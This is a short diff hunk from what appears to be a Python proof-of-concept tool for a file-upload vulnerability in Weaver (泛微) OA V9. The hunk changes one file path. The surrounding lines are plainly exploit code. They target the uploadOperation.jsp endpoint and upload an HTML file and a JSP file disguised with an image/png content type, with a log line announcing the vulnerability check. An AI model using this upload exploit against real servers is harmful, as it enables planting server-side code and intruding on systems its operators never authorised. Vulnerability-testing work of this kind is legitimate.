@@ -22,7 +22,7 @@ def main(target_url):
     vuln_url=target_url+"page/exportImport/uploadOperation.jsp"
     exp_url= target_url+"page/exportImport/fileTransfer/index123.html"
     
-    file1 = [('file1', ('index123.html', open('/main/weaver/poc/index123.html', 'rb'), 'image/png'))]
+    file1 = [('file1', ('index123.html', open('main/weaver/poc/index123.html', 'rb'), 'image/png'))]
     file2 = [('file1', ('index123.jsp', open('main/weaver/poc/index123.jsp', 'rb'), 'image/png'))]
     console.print(now_time() + " [INFO]     正在检测泛微OA V9 文件上传漏洞", style='bold blue')
     try:
